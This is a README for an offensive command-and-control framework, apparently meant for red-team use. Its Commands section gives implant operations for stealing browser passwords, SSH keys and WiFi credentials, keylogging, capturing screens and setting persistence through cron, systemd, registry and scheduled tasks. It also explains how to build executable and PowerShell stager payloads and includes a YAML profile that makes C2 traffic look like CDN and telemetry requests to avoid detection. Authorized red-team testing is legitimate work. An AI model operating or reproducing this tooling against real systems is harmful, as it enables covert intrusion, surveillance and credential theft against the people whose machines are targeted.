# C2 Tool

A Python-based Command and Control framework for red team operations and security testing.

## Features

### Core Capabilities
- **HTTP/HTTPS transport** with configurable URI patterns and malleable profiles
- **Fernet encryption** for all communications
- **Shell command execution** and file transfer (upload/download)
- **ZIP encryption/decryption** for secure file handling
- **Beacon with jitter** - configurable sleep intervals with ±20% variance
- **Session management** - track multiple connected clients
- **Activity logging** - SQLite database tracks all commands and outputs

### Traffic Evasion
- **Malleable C2 profiles** - YAML-based traffic shaping (URIs, headers, data hiding)
- **Header rotation** - User-Agent, Accept-Language, Referer per request
- **URI randomization** - dynamic paths and query parameters
- **mTLS encryption** - mutual TLS with certificate pinning
- **Alternative transports** - WebSocket and SOCKS proxy

### Post-Exploitation
- **Persistent PTY** - full interactive shell with environment state
- **Persistence modules** - cron, systemd, registry, scheduled tasks
- **Port scanner** - TCP connect scanning with port ranges
- **Credential harvesting** - browser passwords, SSH keys, WiFi credentials
- **Screenshot capture** - cross-platform screen capture
- **Keylogger** - keystroke capture and dumping
- **Reverse port forward** - expose remote services through implant

### Advanced Operations
- **P2P pivot links** - chain implants through TCP tunnels
- **DNS tunneling** - TXT/A record C2 channel
- **Multi-operator** - shared state and conflict resolution
- **Domain fronting** - CloudFront/Azure CDN integration
- **Plugin system** - dynamic module loading from `c2/modules/`

### Payload Generation
- **PyInstaller integration** - compile standalone executables
- **PowerShell stager** - one-liner and encoded variants
- **Shellcode generator** - position-independent code

## Architecture

```
c2_tool/
├── c2/
│   ├── client/          # Client-side beacon, PTY, commands
│   ├── crypto/          # Encryption utilities
│   ├── logging/         # SQLite activity logging
│   ├── modules/         # Plugin system (8 modules)
│   ├── server/          # HTTP handler, sessions, server
│   └── transport/       # mTLS, SOCKS, WebSocket
├── config/
│   ├── default.yaml     # Runtime configuration
│   ├── profiles/        # Malleable C2 profiles
│   └── profile_handler.py
├── payloads/            # Payload generator
├── run_server.py
└── run_client.py
```

### Design Principles
- Modularity over monolithic architecture
- Runtime configuration over hardcoded values
- Centralized state management
- Extensible plugin system with dynamic imports

## Installation

```bash
pip install -r requirements.txt
```

**Dependencies:**
- cryptography
- pyzipper
- requests
- aiohttp
- websockets
- inputimeout
- PyYAML

## Quick Start

### Server
```bash
# Edit config/default.yaml first
python run_server.py
```

### Client (implant)
```bash
# Edit config (or pass --config flag)
python run_client.py
python run_client.py --config path/to/config.yaml
```

### Generate Payload
```bash
# Compile client to EXE/onefile/onedir via PyInstaller
python generate_payload.py -f exe -o myimplant

# Generate PowerShell stager script
python generate_payload.py --ps-shellcode -o stager

# Options
python generate_payload.py --help
# -c CONFIG           Config file path
# -f FORMAT           Output format: exe, onefile, onedir
# -o OUTPUT           Output binary name
# -i ICON             Icon file for the binary
# --ps-shellcode      Generate PowerShell stager instead
```

## Configuration

Edit `config/default.yaml` to customize:
- **Beacon interval** and jitter percentage
- **Logging** (enable/disable, database path)
- **mTLS** (certificate paths)
- **Profile** (URI patterns, headers, data hiding)
- **Persistence** targets (cron, systemd, registry)
- **Payload** options (format, architectures)

## Commands

### Client-Side (from server console)
All implant commands are prefixed with `client`:
```
client pty start                 # Start persistent PTY shell
client pty close                 # Close PTY
client pty <cmd>                 # Run command in PTY
client persist cron              # Cron persistence (Linux)
client persist systemd [name]   # Systemd service (Linux, needs root)
client persist registry          # Registry Run key (Windows)
client persist task [name]       # Scheduled task (Windows)
client socks start [port]        # Start SOCKS5 proxy on implant
client socks stop                # Stop SOCKS5 proxy
client scan <host> [ports]       # TCP port scan (ports: "common", "1-1024", "22,80,443")
client screenshot [path]         # Capture screen to file
client keylog start              # Start background keylogger
client keylog stop               # Stop keylogger
client keylog dump               # Read and clear keystroke buffer
client keylog status             # Check if running
client credharvest all           # Collect all available credentials
client credharvest ssh           # SSH keys
client credharvest chrome        # Browser passwords (encrypted DB)
client credharvest history       # Shell history
client credharvest wifi          # Saved WiFi credentials
client rportfwd create <id> <local_port> <remote_host> <remote_port>
client rportfwd remove <id>
client rportfwd list
client p2p create_pivot <name> <team_host> <team_port>
client p2p create_leaf <name> <pivot_host> <pivot_port>
client p2p list
client dns server start <domain> <encryption_key>
client dns server stop
client multiop server start [host] [port]
client multiop operator create <username>
client module <name> [args...]   # Execute any module by name
client download <path>           # Server → client file transfer
client upload <path>             # Client → server file transfer
client zip <path>                # AES-encrypt file on client
client unzip <path>              # Decrypt zip on client
client sleep <seconds>           # Pause polling
client kill                      # Terminate implant
cd <dir>                         # Change directory (no prefix)
<any other text>                 # Shell command (no prefix)
```

### Server-Side (operator console)
```
sessions                      # List all connected sessions
use <session_id>              # Switch active session
exit                          # Exit server
```

## Security and Ethics

This tool is designed for:
- Authorized penetration testing
- Red team assessments
- Network security research

**Never use this tool without explicit written authorization.** Unauthorized access to computer systems is illegal.

The maintainers assume no liability for misuse of this software. Users are responsible for ensuring they have proper authorization before deploying this tool.

## Development

### Adding New Modules
Create a Python file in `c2/modules/` with a `run(args: list[str]) -> str` function:

```python
def run(args: list[str]) -> str:
    """Module entry point. args[0] is the first argument after the module name."""
    if not args:
        return "Usage: my_module <arg>"
    # Module logic here
    return "Module output"
```

Execute from client console:
```
client module my_module arg1 arg2
```

The module will be loaded dynamically from `c2/modules/my_module.py` and executed with the provided arguments.

### Creating Malleable Profiles
Add YAML files to `config/profiles/` following this structure:

```yaml
profile:
  name: "my_profile"
  description: "Mimics MyLegitApp traffic"

http:
  request:                           # Command poll (GET)
    uri_pattern: "/js/app.min.js"
    uri_random_suffix: true          # Appends ?v=abc123
    method: GET
    headers:
      User-Agent: "Mozilla/5.0 ..."
      Accept-Language: "en-US,en;q=0.9"
      Referer: "https://www.example.com/"
    user_agent_rotation:
      enabled: true
      list:
        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36"
    accept_language_rotation:
      enabled: true
      list: ["en-US,en;q=0.9", "en-GB,en;q=0.9"]
    referer_rotation:
      enabled: true
      list: ["https://www.google.com/", "https://www.bing.com/"]

  file_request:                      # File download (GET)
    uri_pattern: "/static/assets/logo.png"
    uri_random_suffix: true

  file_upload:                       # File upload (PUT)
    uri_pattern: "/api/v1/upload"
    headers:
      Content-Type: "application/octet-stream"

  response:                          # Command output (POST)
    uri_pattern: "/api/v1/telemetry"
    post_key: "data"                 # Form field name for encrypted payload

  cwd_response:                      # CWD update (POST)
    uri_pattern: "/api/v1/cwd"
    post_key: "cwd"

data:
  hide_in_headers: false
  hide_in_cookies: false
```

Activate the profile in `config/default.yaml`:
```yaml
profile: "my_profile"
```

See `config/profiles/jquery_cdn.yaml` and `config/profiles/amazon_cdn.yaml` for
full working examples.

Key field reference:
- `uri_pattern` — base path for the request type
- `uri_random_suffix` — append `?v=<random6>` to defeat URI fingerprinting
- `*_rotation` blocks — rotate that header value per-request from the list
- `post_key` — form field name in POST body that carries encrypted data

## License

[License information to be added]
